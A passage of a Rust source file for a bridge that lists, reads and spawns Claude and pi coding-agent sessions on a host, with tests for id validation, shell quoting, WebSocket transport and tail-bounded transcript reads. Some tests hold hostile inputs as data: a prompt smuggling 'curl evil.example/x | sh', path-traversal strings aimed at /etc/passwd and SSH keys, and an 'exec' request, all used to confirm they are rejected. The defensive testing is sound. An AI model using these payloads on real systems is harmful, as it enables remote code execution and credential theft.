                    // shape of each one.
                    transcript::Speaker::System => Role::System,
                },
                text: e.text,
                at: e.timestamp,
                tool: e.tool,
            })
            .collect(),
        truncated,
    ))
}

/// Where Claude keeps the transcript for a conversation id.
///
/// Searched rather than derived. The project directory's name is a slug of the
/// folder, and **that slug's scheme changed between Claude versions**, so
/// building the path from a `cwd` is right on one host and wrong on the next.
/// The file is named for the session id, which has not changed.
fn find_transcript(id: &str) -> anyhow::Result<std::path::PathBuf> {
    // Refused before it reaches the filesystem. The id comes from a remote
    // caller, and `../../.ssh/id_ed25519` under a `.jsonl` join would otherwise
    // read whatever it liked out of the home directory.
    anyhow::ensure!(
        !id.is_empty()
            && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
        "{id:?} is not a conversation id",
    );

    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let projects = home.join(".claude").join("projects");
    let wanted = format!("{id}.jsonl");

    for entry in std::fs::read_dir(&projects)?.flatten() {
        let candidate = entry.path().join(&wanted);
        if candidate.is_file() {
            return Ok(candidate);
        }
    }
    anyhow::bail!("no transcript for conversation {id} on this host")
}

/// Every pi conversation on this host.
///
/// Read straight off the local filesystem, not through a shell script: the
/// bridge runs on the host, so `~/.pi/agent/sessions/*/*.jsonl` is right there.
/// (The Claude path shells out only because the desktop app reads it over ssh.)
/// pi's directory encodes the cwd, but the header's own `cwd` is the authority —
/// the same belt-and-braces the Claude reader uses.
fn pi_conversations(limit: Option<u32>, folder: Option<&str>) -> anyhow::Result<Vec<Conversation>> {
    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let root = std::path::PathBuf::from(pi::sessions_root(&home.to_string_lossy()));

    // The status snapshot now includes pi, keyed by its conversation id, because
    // the rmux status extension publishes one file per running pi session — so a
    // conversation that is live is flagged `running` exactly as Claude's is.
    let running = status::snapshot();
    let wanted_folder = folder.map(|f| f.trim_end_matches('/').to_owned());

    let mut all: Vec<Conversation> = Vec::new();
    let Ok(dirs_iter) = std::fs::read_dir(&root) else { return Ok(all) };
    for dir in dirs_iter.flatten() {
        let Ok(files) = std::fs::read_dir(dir.path()) else { continue };
        for file in files.flatten() {
            let path = file.path();
            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
                continue;
            }
            let Some(convo) = pi_conversation_at(&path) else { continue };

            if let Some(want) = &wanted_folder {
                let matches = convo.cwd.as_deref().is_some_and(|f| {
                    let f = f.trim_end_matches('/');
                    f == want || f.strip_prefix(want.as_str()).is_some_and(|r| r.starts_with('/'))
                });
                if !matches {
                    continue;
                }
            }

            all.push(Conversation {
                running: running.iter().any(|r| r.session_id == convo.id),
                id: convo.id,
                folder: convo.cwd,
                summary: convo.summary,
                modified: convo.modified,
                size: convo.size,
            });
        }
    }

    all.sort_by_key(|c| std::cmp::Reverse(c.modified.unwrap_or(0)));
    if let Some(limit) = limit {
        all.truncate(limit as usize);
    }
    Ok(all)
}

/// One pi conversation on disk: id, cwd, summary, mtime, size.
fn pi_conversation_at(path: &std::path::Path) -> Option<pi::Conversation> {
    let meta = std::fs::metadata(path).ok()?;
    let modified = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_millis() as u64);

    // The id is the filename stem, confirmed against the header where readable.
    let stem = path.file_stem().and_then(|s| s.to_str())?.to_owned();

    // Header is the first line; the first human message is the summary. Reading a
    // bounded prefix keeps a giant transcript from being slurped just to list it.
    let prefix = read_prefix(path, 64 * 1024).unwrap_or_default();
    let mut lines = prefix.split(|&b| b == b'\n');
    let header = lines.next().and_then(pi::parse_header).unwrap_or_default();
    let summary = pi::parse(&prefix, false)
        .entries
        .into_iter()
        .find(|e| matches!(e.speaker, rmux_claude_core::Speaker::User))
        .map(|e| e.text.lines().next().unwrap_or("").trim().to_owned())
        .filter(|s| !s.is_empty());

    Some(pi::Conversation {
        id: header.id.unwrap_or(stem),
        cwd: header.cwd,
        summary,
        modified,
        size: Some(meta.len()),
    })
}

/// The first `max` bytes of a file, for a cheap header + summary read.
fn read_prefix(path: &std::path::Path, max: usize) -> std::io::Result<Vec<u8>> {
    use std::io::Read;
    let mut file = std::fs::File::open(path)?;
    let mut buf = vec![0u8; max];
    let n = file.read(&mut buf)?;
    buf.truncate(n);
    Ok(buf)
}

/// Read one pi conversation back, tail-bounded.
fn pi_read_conversation(id: &str, max_bytes: Option<u64>) -> anyhow::Result<(Vec<Message>, bool)> {
    let tail = max_bytes.unwrap_or(DEFAULT_TAIL_BYTES).clamp(1, MAX_TAIL_BYTES);
    let path = find_pi_transcript(id)?;

    // Same walk-back as the Claude path — a cap smaller than the last record must
    // still return that record. Shared helper so the two behaviours cannot drift.
    let (bytes, _size, truncated) = read_tail_including_last_record(&path, tail)?;

    let parsed = pi::parse(&bytes, truncated);
    Ok((
        parsed
            .entries
            .into_iter()
            .map(|e| Message {
                role: match e.speaker {
                    rmux_claude_core::Speaker::User => Role::User,
                    rmux_claude_core::Speaker::Assistant => Role::Assistant,
                    rmux_claude_core::Speaker::Tool => Role::Tool,
                    rmux_claude_core::Speaker::System => Role::System,
                },
                text: e.text,
                at: e.timestamp,
                tool: e.tool,
            })
            .collect(),
        truncated,
    ))
}

/// Where pi keeps the transcript for a conversation id.
///
/// Searched by filename across every cwd-encoded directory, because a caller
/// knows the id, not the folder. Validated first — the id lands in a path.
fn find_pi_transcript(id: &str) -> anyhow::Result<std::path::PathBuf> {
    anyhow::ensure!(
        !id.is_empty() && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
        "{id:?} is not a conversation id",
    );
    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let root = std::path::PathBuf::from(pi::sessions_root(&home.to_string_lossy()));

    // **pi names files `<ISO-timestamp>_<id>.jsonl`, not `<id>.jsonl`.** Measured
    // on a real host: `2026-08-18T09-59-47-711Z_rmuxlive01.jsonl` for id
    // `rmuxlive01`. So the id is matched against the header's own `id` (the
    // authority), with a filename-suffix fallback for a truncated/odd header.
    for dir in std::fs::read_dir(&root)?.flatten() {
        let Ok(files) = std::fs::read_dir(dir.path()) else { continue };
        for file in files.flatten() {
            let path = file.path();
            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
                continue;
            }
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            let header_id = read_prefix(&path, 8 * 1024)
                .ok()
                .and_then(|b| b.split(|&c| c == b'\n').next().and_then(pi::parse_header).and_then(|h| h.id));
            if header_id.as_deref() == Some(id)
                || name == format!("{id}.jsonl")
                || name.ends_with(&format!("_{id}.jsonl"))
            {
                return Ok(path);
            }
        }
    }
    anyhow::bail!("no pi transcript for conversation {id} on this host")
}

/// Start a coding-agent session in `folder`.
async fn spawn(
    agent: Agent,
    folder: &str,
    prompt: Option<&str>,
    name: Option<&str>,
    model_profile: Option<&str>,
) -> anyhow::Result<Session> {
    // A model profile decides **where the operator's credential is sent**, so an
    // unknown name is refused rather than quietly falling back to Anthropic.
    // Silently changing provider is the failure worth being loud about — and the
    // bridge has no profile store of its own, so any name at all is unknown here.
    anyhow::ensure!(
        model_profile.is_none(),
        "model profiles are applied by rmux, not the bridge; \
         start this session from rmux if it needs a specific provider",
    );

    let folder = expand_home(folder)?;
    // **Must already exist.** Creating it would mean a typo in an agent's tool
    // call silently produces a directory tree on someone's server.
    anyhow::ensure!(
        std::path::Path::new(&folder).is_dir(),
        "{folder} is not a directory on this host",
    );

    // The prompt travels as an *argument* rather than being typed in afterwards.
    // Typing means guessing when the TUI is ready to receive it, and a guess that
    // is early loses the message into a composer that has not been drawn yet.
    // `launch_line` shell-quotes it, which is the injection boundary that matters
    // most in this whole feature — it is free text from a remote caller landing
    // in a login shell.
    // The prompt is a launch argument for both agents — Claude quotes it after
    // `claude`, pi as a `--` positional — because typing it in afterwards means
    // guessing when the TUI is ready and losing it into a composer not yet drawn.
    let (line, prefix) = match agent {
        Agent::Claude => {
            let args: Vec<String> = prompt
                .map(str::trim)
                .filter(|p| !p.is_empty())
                .map(|p| vec![p.to_owned()])
                .unwrap_or_default();
            (launch::launch_line(None, &args, launch::Rendering::default()), "claude")
        }
        // pi runs inline (`--tui-mode regular`) for the same reasons Claude opts
        // out of the alternate screen — see `pi::launch_line`.
        Agent::Pi => {
            // Give pi the status signal Claude has for free. Install the
            // extension (idempotent, best-effort — a host that cannot take it
            // still runs pi, just without the dot) and tell it where the writer
            // is via `RMUX_AGENT_BIN`. The env goes on the **shell line**, like
            // Claude's `CLAUDE_CODE_*` prefix: an assignment prefix does not stop
            // the login shell exec-ing the single command, so pi keeps the
            // session's own pid and `live_sessions` still correlates on it.
            if let Some(home) = dirs::home_dir().and_then(|h| h.to_str().map(str::to_owned))
                && let Err(e) = pi::install_status_extension(&home)
            {
                tracing::warn!(error = %e, "could not install pi status extension");
            }
            let line = pi::launch_line(prompt, name, None);
            let line = match std::env::current_exe().ok().and_then(|p| p.to_str().map(str::to_owned)) {
                Some(bin) => format!("RMUX_AGENT_BIN={} {line}", rmux_transport::shell_quote(&bin)),
                None => line,
            };
            (line, "pi")
        }
    };

    // Named for its agent so rmux's rail adopts it as the right kind rather than
    // a stranger. The suffix is the host's clock, not a counter: two spawns in
    // the same second from different callers must not collide onto one shell.
    let session = format!(
        "{prefix}-{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or_default()
    );

    attach::spawn_detached(&session, &folder, &line, SPAWN_COLS, SPAWN_ROWS).await?;

    if let Some(name) = name.map(str::trim).filter(|n| !n.is_empty()) {
        // Best-effort: a session that started but could not be named is still a
        // session, and failing the whole spawn over a label would be worse than
        // returning it with the raw key.
        let live: Vec<String> = attach::list()
            .await
            .unwrap_or_default()
            .into_iter()
            .map(|s| s.name)
            .collect();
        if let Err(e) = alias::set(&session, name, &live) {
            tracing::warn!(error = %e, "could not name the spawned session");
        }
    }

    // Give the daemon a moment so the answer carries a real pid and status
    // rather than an empty shell of a record the caller has to poll for.
    tokio::time::sleep(SPAWN_SETTLE).await;

    Ok(live_sessions()
        .await?
        .into_iter()
        .find(|s| s.name == session)
        .unwrap_or(Session {
            name: session,
            kind: match agent {
                Agent::Claude => Kind::Claude,
                Agent::Pi => Kind::Pi,
            },
            folder: Some(folder),
            title: name.map(str::to_owned),
            ..Default::default()
        }))
}

/// Resolve a leading `~`, which a remote caller has no way to expand itself.
fn expand_home(folder: &str) -> anyhow::Result<String> {
    let Some(rest) = folder.strip_prefix("~/").or_else(|| folder.strip_prefix("~")) else {
        return Ok(folder.to_owned());
    };
    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("no home directory"))?;
    let rest = rest.trim_start_matches('/');

    // `Path::join("")` appends a separator, so a bare `~` would expand to
    // `/home/dev.user/` — which then reaches Redstone's UI, and rmux's rail, as a
    // folder that does not string-compare equal to the same directory written
    // any other way.
    if rest.is_empty() {
        return Ok(home.to_string_lossy().into_owned());
    }
    Ok(home.join(rest).to_string_lossy().into_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_unknown_claude_status_is_unknown_rather_than_idle() {
        // Claude adds statuses. Mapping an unrecognised one onto `Idle` would
        // report a session that is plainly working as finished, which is the
        // rail's single most important signal being wrong.
        assert_eq!(parse_status("busy"), Status::Busy);
        assert_eq!(parse_status("waiting"), Status::Waiting);
        assert_eq!(parse_status("compacting"), Status::Unknown);
        assert_eq!(parse_status(""), Status::Unknown);
    }

    #[test]
    fn a_conversation_id_cannot_walk_out_of_the_projects_directory() {
        // The id arrives from a remote caller and is joined onto a path. Without
        // this check, `../../.ssh/id_ed25519` (with a crafted suffix) would read
        // whatever it liked out of the home directory.
        for hostile in ["../../../etc/passwd", "..", "a/b", "a/../../b", ""] {
            assert!(
                find_transcript(hostile).is_err(),
                "{hostile:?} was not rejected",
            );
        }
    }

    #[test]
    fn a_home_relative_folder_is_expanded() {
        // A remote caller cannot know the operator's home path, so `~/api` is the
        // natural thing for an agent to send.
        let home = dirs::home_dir().unwrap().to_string_lossy().into_owned();
        assert_eq!(expand_home("~/api").unwrap(), format!("{home}/api"));
        assert_eq!(expand_home("~").unwrap(), home);
        assert_eq!(expand_home("/srv/api").unwrap(), "/srv/api");
    }

    #[test]
    fn a_spawn_prompt_is_quoted_into_one_argument() {
        // The single highest-risk path in the feature: free text from a remote
        // caller, landing in a login shell line.
        let line = launch::launch_line(
            None,
            &["ship it; curl evil.example/x | sh".into()],
            launch::Rendering::default(),
        );
        assert!(
            line.ends_with("claude 'ship it; curl evil.example/x | sh'"),
            "prompt was not contained: {line}"
        );
    }

    /// The transport, end to end, against a real WebSocket server.
    ///
    /// Everything else in this file is testable as a pure function; this is the
    /// part that is not, and it is the part that fails on a host at three in the
    /// morning. Three things are proven here and each has its own way of being
    /// silently wrong:
    ///
    /// - the **`Authorization` header is actually sent**, so a token that never
    ///   leaves the file cannot pass for an authenticated bridge;
    /// - the greeting is emitted **unprompted**, before anything asks — a bridge
    ///   that waits to be spoken to would hang against a server that is waiting
    ///   for it;
    /// - a request is answered with a frame carrying **the same `id`**, which is
    ///   the whole basis of demultiplexing and looks fine right up until two
    ///   requests are in flight.
    ///
    /// `ws://` rather than `wss://` deliberately: TLS is rustls's to get right,
    /// and a self-signed certificate here would test our willingness to trust one.
    // The callback's signature is tungstenite's, not ours: `accept_hdr_async`
    // requires exactly `Result<Response, ErrorResponse>`, and `ErrorResponse` is
    // an `http::Response` at 136 bytes. Boxing it would not typecheck.
    #[allow(clippy::result_large_err)]
    #[tokio::test]
    async fn the_transport_greets_authenticates_and_answers_by_id() {
        use tokio_tungstenite::tungstenite::handshake::server::{
            ErrorResponse, Request as HandshakeRequest, Response as HandshakeResponse,
        };

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();

            let seen_auth = std::sync::Arc::new(std::sync::Mutex::new(None::<String>));
            let captured = std::sync::Arc::clone(&seen_auth);
            let mut socket = tokio_tungstenite::accept_hdr_async(
                stream,
                move |request: &HandshakeRequest,
                      response: HandshakeResponse|
                      -> Result<HandshakeResponse, ErrorResponse> {
                    *captured.lock().unwrap() = request
                        .headers()
                        .get("authorization")
                        .and_then(|v| v.to_str().ok())
                        .map(str::to_owned);
                    Ok(response)
                },
            )
            .await
            .unwrap();

            // The greeting must arrive with nothing having asked for it.
            let greeting = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected the hello, got {other:?}"),
            };

            // A method with no side effects: `hostInfo` touches no daemon and
            // starts nothing, so this test never leaves a shell behind.
            socket
                .send(tungstenite::Message::Text(
                    serde_json::to_string(&Frame::Request { id: 99, request: Request::HostInfo })
                        .unwrap()
                        .into(),
                ))
                .await
                .unwrap();

            let reply = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected a response, got {other:?}"),
            };

            let auth = seen_auth.lock().unwrap().clone();
            socket.close(None).await.ok();
            (auth, greeting, reply)
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "rbt_test_token".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.expect("the bridge should run to a clean close");

        let (auth, greeting, reply) = server.await.unwrap();

        assert_eq!(
            auth.as_deref(),
            Some("Bearer rbt_test_token"),
            "the token never reached the wire",
        );

        let hello: Hello = serde_json::from_str(&greeting).expect("the greeting must parse");
        assert_eq!(hello.protocol, VERSION);
        assert_eq!(hello.agent_version, crate::provision::VERSION);
        // The token must not be anywhere in the frame — it belongs in the header
        // alone, or it lands in every log that records a message body.
        assert!(!greeting.contains("rbt_test_token"), "the token leaked into a frame: {greeting}");

        match serde_json::from_str::<Frame>(&reply).expect("the response must parse") {
            Frame::Response { id, response: Response::Host { .. } } => {
                assert_eq!(id, 99, "a response must carry the id of its request");
            }
            other => panic!("answered with {other:?}"),
        }
    }

    #[test]
    fn the_host_names_itself_on_this_platform() {
        // The first version read `/proc/sys/kernel/hostname`, which is correct on
        // the Linux hosts the agent usually runs on and absent on macOS — where
        // it also runs, for local sessions. Measured against a real bridge: every
        // macOS host announced itself as `"unknown"`, which is what an operator
        // would then see in Redstone's host list for their own laptop.
        //
        // Asserted as "not the fallback" rather than against a fixed name, since
        // the right answer differs on every machine this runs on.
        let name = hostname();
        assert!(!name.is_empty());
        assert_ne!(name, "unknown", "the host could not name itself");
    }

    /// An unknown method is answered rather than ignored.
    ///
    /// Found by running it: a live bridge given `{"method":"exec"}` produced *no
    /// reply at all*, and the caller hung until it timed out. A caller cannot
    /// tell that apart from a dead host — the wrong conclusion, since a newer
    /// Redstone against an older agent is the ordinary case.
    ///
    /// Note what this also pins: an unknown method is answered with an **error**,
    /// never executed. `exec` is the example on purpose.
    #[allow(clippy::result_large_err)]
    #[tokio::test]
    async fn an_unknown_method_is_answered_rather_than_ignored() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut socket = tokio_tungstenite::accept_async(stream).await.unwrap();
            let _greeting = socket.next().await.unwrap().unwrap();

            socket
                .send(tungstenite::Message::Text(
                    r#"{"id":41,"method":"exec","cmd":"id"}"#.into(),
                ))
                .await
                .unwrap();

            let reply = match socket.next().await.unwrap().unwrap() {
                tungstenite::Message::Text(text) => text.to_string(),
                other => panic!("expected a response, got {other:?}"),
            };
            socket.close(None).await.ok();
            reply
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "t".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.unwrap();

        let reply = server.await.unwrap();
        match serde_json::from_str::<Frame>(&reply).expect("the answer must parse") {
            Frame::Response { id, response: Response::Error { code, message } } => {
                assert_eq!(id, 41, "the answer must carry the request's id");
                assert_eq!(code, ErrorCode::Unsupported);
                assert!(message.contains("exec"), "the method should be named: {message}");
            }
            other => panic!("answered with {other:?}"),
        }
    }

    /// A keepalive ping is answered even with no application traffic.
    ///
    /// Redstone's keepalive is **protocol-level** WebSocket pings from uvicorn,
    /// roughly every 20s, and it sends no application-level ping method — quite
    /// rightly, since this bridge would answer `unsupported` to every one.
    ///
    /// So the pong has to come out of the read path with nothing else flowing.
    /// tungstenite queues a pong on receipt, but a queued frame that is never
    /// flushed is a connection that dies at the load balancer's idle timeout —
    /// and the symptom is a host that silently disappears about a minute after
    /// connecting, which reads as a network fault rather than a missing flush.
    #[tokio::test]
    async fn a_keepalive_ping_is_answered_without_any_application_traffic() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut socket = tokio_tungstenite::accept_async(stream).await.unwrap();
            let _greeting = socket.next().await.unwrap().unwrap();

            let mut pongs = 0;
            for n in 0..3u8 {
                socket
                    .send(tungstenite::Message::Ping(vec![n].into()))
                    .await
                    .unwrap();

                // Nothing else is sent, so anything that comes back is the
                // answer to the ping.
                match tokio::time::timeout(
                    std::time::Duration::from_secs(5),
                    socket.next(),
                )
                .await
                {
                    Ok(Some(Ok(tungstenite::Message::Pong(_)))) => pongs += 1,
                    other => panic!("expected a pong, got {other:?}"),
                }
            }
            socket.close(None).await.ok();
            pongs
        });

        let enrolment = Enrolment {
            endpoint: format!("ws://127.0.0.1:{port}/bridge"),
            token: "t".into(),
            host_id: None,
            enrolled_by: None,
            enrolled_at: None,
        };
        serve(&enrolment).await.unwrap();

        assert_eq!(server.await.unwrap(), 3, "keepalive pings went unanswered");
    }

    /// A rejected token must not turn into a hot loop.
    ///
    /// This is the bug the extraction exists to pin. Redstone answers an unknown
    /// or revoked token with a **1008 policy close**, which is a *clean* close —
    /// and the original loop reset the backoff on every clean close, so a
    /// revoked host would have redialled once a second, for ever, against a
    /// production server. Exactly the fail2ban-shaped failure this file's own
    /// documentation warns about.
    #[test]
    fn a_rejected_token_backs_all_the_way_off_rather_than_hammering() {
        let rejected: anyhow::Result<Option<u16>> = Ok(Some(REJECTED));

        // Instantly, and from the floor — the case that used to loop.
        assert_eq!(
            next_backoff(&rejected, Duration::from_millis(20), REDIAL_MIN),
            REDIAL_MAX,
            "a refused credential must go straight to the ceiling",
        );
        // …and it stays there however long the socket happened to be held open.
        assert_eq!(
            next_backoff(&rejected, Duration::from_secs(600), REDIAL_MIN),
            REDIAL_MAX,
        );
    }

    #[test]
    fn only_a_connection_that_lasted_resets_the_backoff() {
        let closed: anyhow::Result<Option<u16>> = Ok(None);
        let normal: anyhow::Result<Option<u16>> = Ok(Some(1000));

        // A server restart after a real session: come back quickly.
        assert_eq!(next_backoff(&closed, HEALTHY, Duration::from_secs(32)), REDIAL_MIN);
        assert_eq!(next_backoff(&normal, HEALTHY, Duration::from_secs(32)), REDIAL_MIN);

        // Accepted and dropped immediately, with a *normal* close code: grow.
        // This is the case that separates "lasted" from "ended politely".
        assert_eq!(
            next_backoff(&normal, Duration::from_millis(10), Duration::from_secs(2)),
            Duration::from_secs(4),
        );

        // The error path follows the same rule, and is capped.
        let failed: anyhow::Result<Option<u16>> = Err(anyhow::anyhow!("connection refused"));
        assert_eq!(
            next_backoff(&failed, Duration::from_millis(5), Duration::from_secs(40)),
            REDIAL_MAX,
        );
        assert_eq!(next_backoff(&failed, Duration::from_secs(90), REDIAL_MAX), REDIAL_MIN);
    }

    #[test]
    fn the_close_code_is_read_rather_than_bound() {
        // `Ok(Some(REJECTED))` reads as a pattern only because `REJECTED` is a
        // `const`. Had it been a local binding it would have matched *every*
        // close code and silently treated a routine disconnect as a rejection —
        // which looks identical in the logs and takes an hour to find.
        let normal: anyhow::Result<Option<u16>> = Ok(Some(1000));
        assert_ne!(
            next_backoff(&normal, Duration::from_millis(10), REDIAL_MIN),
            REDIAL_MAX,
            "1000 was treated as a rejection",
        );
    }

    #[test]
    fn a_raw_jsonl_transcript_reads_back_non_empty() {
        // The shipped bug: the bridge reads a raw `.jsonl` off disk (no
        // `id\0size\0` framing) and used to hand it to `transcript::parse`, whose
        // first act is `split_output` — which finds no NUL and returns an empty
        // transcript. So a real conversation came back as `{messages:[]}`. This
        // pins the read path against a real file.
        let dir = std::env::temp_dir().join(format!(
            "rmux-bridge-read-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or_default(),
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("conv-read-test.jsonl");
        // Twenty short records, so a tail read still spans several complete lines
        // after the leading partial is dropped.
        let mut body = String::new();
        for i in 0..20 {
            body.push_str(&format!(
                r#"{{"type":"user","message":{{"role":"user","content":"msg {i:02}"}}}}"#,
            ));
            body.push('\n');
        }
        std::fs::write(&path, &body).unwrap();
        let full_len = body.len() as u64;

        // Fits comfortably: not truncated, every message present.
        let (messages, truncated) =
            read_transcript_at("conv-read-test", &path, None).unwrap();
        assert!(!truncated, "a small file must not report truncated");
        assert_eq!(messages.len(), 20, "raw jsonl read back short — the shipped bug");
        assert_eq!(messages[0].role, Role::User);
        assert_eq!(messages[0].text, "msg 00");
        assert_eq!(messages[19].text, "msg 19");

        // A `max_bytes` well under the file size forces a tail read: `truncated`
        // is true, the leading partial line is dropped, but messages are still
        // returned — not an empty list, which was the bug in disguise.
        let cap = full_len / 3;
        let (tail_messages, tail_truncated) =
            read_transcript_at("conv-read-test", &path, Some(cap)).unwrap();
        assert!(tail_truncated, "a cap below the file size must report truncated");
        assert!(
            !tail_messages.is_empty(),
            "a truncated read must still return messages, not an empty list",
        );
        // The tail holds the *newest* messages; the last one is always present.
        assert_eq!(tail_messages.last().unwrap().text, "msg 19");

        // The BOUNDARY, which the `maxBytes`-not-mapping bug defeated silently:
        // the cap must actually change the answer. Redstone measured identical
        // responses across `maxBytes` 1024 / 16384 / 8388608 because the field
        // deserialised to `None` every time and the read fell back to
        // DEFAULT_TAIL_BYTES. Asserting `truncated == true` alone did not catch
        // that — it passes against a hardcoded `true`. So pin the ordering:
        //
        //  - a small cap returns strictly FEWER messages than a large cap, and
        //  - a cap >= the file size returns `truncated == false` with ALL of them.
        let (small_messages, small_truncated) =
            read_transcript_at("conv-read-test", &path, Some(cap)).unwrap();
        let (large_messages, large_truncated) =
            read_transcript_at("conv-read-test", &path, Some(full_len * 4)).unwrap();
        assert!(small_truncated, "a small cap must truncate");
        assert!(!large_truncated, "a cap over the file size must not truncate");
        assert!(
            small_messages.len() < large_messages.len(),
            "a small cap ({}) must return fewer messages than a large one ({}) — \
             the maxBytes-ignored bug made these equal",
            small_messages.len(),
            large_messages.len(),
        );
        assert_eq!(
            large_messages.len(),
            20,
            "a cap at or above the file size must return every message",
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn the_tail_is_bounded_however_much_is_asked_for() {
        // A caller asking for the whole of a 228 MB transcript would otherwise
        // allocate it, on a machine doing real work.
        assert_eq!(u64::MAX.clamp(1, MAX_TAIL_BYTES), MAX_TAIL_BYTES);
        assert_eq!(0u64.clamp(1, MAX_TAIL_BYTES), 1);
    }

    /// A unique temp path per test, cleaned by the caller.
    fn scratch_transcript(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "rmux-bridge-walkback-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or_default(),
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir.join("conv.jsonl")
    }

    #[test]
    fn a_cap_below_the_last_record_still_returns_it() {
        // THE REGRESSION. Redstone measured caps of 1024/2048/4096 returning zero
        // messages on a real transcript whose last record was larger than the cap:
        // `seek(size - tail)` landed inside that final record, and dropping the
        // leading partial left nothing. A non-empty file must never return empty.
        let path = scratch_transcript("last-record");
        // Two short records, then one record far larger than any small cap.
        let big = "x".repeat(20_000);
        let last = format!(
            r#"{{"type":"assistant","message":{{"role":"assistant","content":"{big}"}}}}"#
        );
        let body = format!(
            "{}\n{}\n{last}\n",
            r#"{"type":"user","message":{"role":"user","content":"first"}}"#,
            r#"{"type":"user","message":{"role":"user","content":"second"}}"#,
        );
        std::fs::write(&path, &body).unwrap();

        // A cap far smaller than the last record.
        for cap in [1024u64, 2048, 4096] {
            let (messages, truncated) =
                read_transcript_at("conv", &path, Some(cap)).unwrap();
            assert!(
                !messages.is_empty(),
                "cap {cap}: a non-empty file returned zero messages — the regression",
            );
            assert!(truncated, "cap {cap}: a read below file size must report truncated");
            // The last record is the big assistant message; it must be the one kept.
            assert_eq!(
                messages.last().unwrap().role,
                Role::Assistant,
                "cap {cap}: the last complete record was not the one returned",
            );
            assert_eq!(messages.last().unwrap().text.len(), big.len());
        }

        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }

    #[test]
    fn a_larger_cap_never_returns_fewer_records_than_a_smaller_one() {
        // Monotonic-ish sanity. The point is not an exact count — it is that the
        // small cap is non-empty and never exceeds the large cap.
        let path = scratch_transcript("monotonic");
        let mut body = String::new();
        for i in 0..40 {
            body.push_str(&format!(
                r#"{{"type":"user","message":{{"role":"user","content":"msg {i:02}"}}}}"#,
            ));
            body.push('\n');
        }
        std::fs::write(&path, &body).unwrap();
        let full = body.len() as u64;

        let (small, small_trunc) = read_transcript_at("conv", &path, Some(200)).unwrap();
        let (mid, _) = read_transcript_at("conv", &path, Some(full / 2)).unwrap();
        let (large, large_trunc) = read_transcript_at("conv", &path, Some(full * 4)).unwrap();

        assert!(!small.is_empty(), "small cap must still return at least one record");
        assert!(small_trunc, "a small cap must report truncated");
        assert!(!large_trunc, "a cap over the file size must not truncate");
        assert!(small.len() <= mid.len(), "small must not exceed mid");
        assert!(mid.len() <= large.len(), "mid must not exceed large");
        assert_eq!(large.len(), 40, "a cap over the file size returns everything");
        // Newest record is always present regardless of cap.
        assert_eq!(small.last().unwrap().text, "msg 39");

        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }

    #[test]
    fn an_empty_file_returns_no_messages() {
        // Empty in, empty out — the guarantee is only *non-empty ⇒ at least one*.
        let path = scratch_transcript("empty");
        std::fs::write(&path, b"").unwrap();
        let (messages, truncated) = read_transcript_at("conv", &path, Some(1024)).unwrap();
        assert!(messages.is_empty(), "an empty file must return no messages");
        assert!(!truncated, "an empty file cannot be truncated");
        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }

    #[test]
    fn the_helper_walks_back_to_a_record_boundary_at_the_byte_level() {
        // Unit-level proof of the shared helper both paths use: when the cap lands
        // inside the last record, the returned bytes begin at (or one newline
        // before) that record's start, and always contain the last record whole.
        let path = scratch_transcript("bytes");
        let big = "y".repeat(5_000);
        let last = format!("{{\"k\":\"{big}\"}}");
        let body = format!("{{\"k\":\"a\"}}\n{{\"k\":\"b\"}}\n{last}\n");
        std::fs::write(&path, body.as_bytes()).unwrap();
        let size = std::fs::metadata(&path).unwrap().len();

        // tail smaller than the last record forces the walk-back.
        let (bytes, reported_size, truncated) =
            read_tail_including_last_record(&path, 1024).unwrap();
        assert_eq!(reported_size, size, "size must be the true file length");
        assert!(truncated, "a walked-back read below file size is truncated");
        // The last complete record is present in full, in the raw bytes.
        assert!(
            std::str::from_utf8(&bytes).unwrap().contains(&last),
            "the last complete record was not fully included",
        );
        // And a cap at/above file size reads the whole file, untruncated.
